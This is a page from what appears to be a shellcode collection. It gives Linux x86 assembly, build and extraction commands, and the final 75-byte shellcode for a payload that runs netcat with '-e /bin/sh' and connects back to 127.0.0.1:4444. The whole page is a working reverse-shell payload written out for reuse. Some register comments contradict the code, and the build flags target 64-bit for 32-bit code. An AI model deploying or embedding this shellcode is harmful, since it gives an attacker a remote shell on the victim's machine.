---
layout: default
title: Execve netcat Reverse Shell (127.0.0.1:4444)
permalink: /shellcode/asm-23.html
os: Linux
arch: Intel x86
length: 75
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor ebx, ebx				; EBX = 0
	xor ecx, ecx				; ECX = 0
	mul ebx					; EAX, EDX = 0

	push eax				; Push null terminator
	push 0x636e2f2f				; Push "//nc"
	push 0x6e69622f				; Push "/bin"
	mov ebx, esp				; EBX -> "/bin//nc"

	push eax				; Push null terminator
	push byte 0x31				; Push "1"
	push 0x2e302e30				; Push "0.0."
	push 0x2e373231				; Push "127."
	mov ecx, esp				; ESI -> "127.0.0.1"

	push eax				; Push null terminator
	push 0x34343434				; Push "4444"
	mov edx, esp				; EDI -> "4444"

	push eax				; Push null terminator
	push word 0x652d			; Push "-e"
	mov edi, esp

	push eax				; Push null terminator
	push 0x68732f2f				; Push "//sh"
	push 0x6e69622f				; Push "/bin"
	mov esi, esp				; EDX -> "/bin//sh"

	push eax				; Push null terminator
	push esi				; Push "/bin//sh"
	push edi				; Push "-e"
	push edx				; Push "4444"
	push ecx				; Push "127.0.0.1"
	push ebx				; Push "/bin//nc"
	mov ecx, esp				; ECX -> {"/bin//nc", "127.0.0.1", "4444", "-e", "/bin//sh"}

	mov al, 0xb				; EAX = 0xb (execve syscall number)
	cdq                                     ; EDX = 0
	int 0x80                                ; Execute execve syscall
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xdb\x31\xc9\xf7\xe3\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x6a\x31\x68\x30\x2e\x30\x2e\x68\x31\x32\x37\x2e\x89\xe1\x50\x68\x34\x34\x34\x34\x89\xe2\x50\x66\x68\x2d\x65\x89\xe7\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x57\x52\x51\x53\x89\xe1\xb0\x0b\x99\xcd\x80
```